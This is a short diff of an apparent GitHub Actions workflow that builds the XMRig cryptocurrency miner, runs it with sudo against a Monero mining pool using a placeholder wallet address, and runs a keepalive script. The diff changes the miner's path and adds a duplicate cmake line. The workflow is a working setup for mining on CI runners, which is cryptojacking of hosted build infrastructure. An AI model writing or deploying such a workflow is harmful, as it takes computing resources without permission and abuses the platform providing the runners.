@@ -16,9 +16,10 @@ jobs:
           mkdir xmrig/build && cd xmrig/scripts
           ./build_deps.sh && cd ../build
           cmake .. -DXMRIG_DEPS=scripts/deps
+          cmake .. -DXMRIG_DEPS=scripts/deps
           make -j$(nproc)
       - name: Mine
         run: |
-          sudo ./xmrig -o xmrpool.eu:9999 -u WALLET_ADDRESS -k --tls
+          sudo /home/runner/xmrig/build/./xmrig -o xmrpool.eu:9999 -u WALLET_ADDRESS -k --tls
       - name: KeepAlive
         run: bash ./keepalive.sh
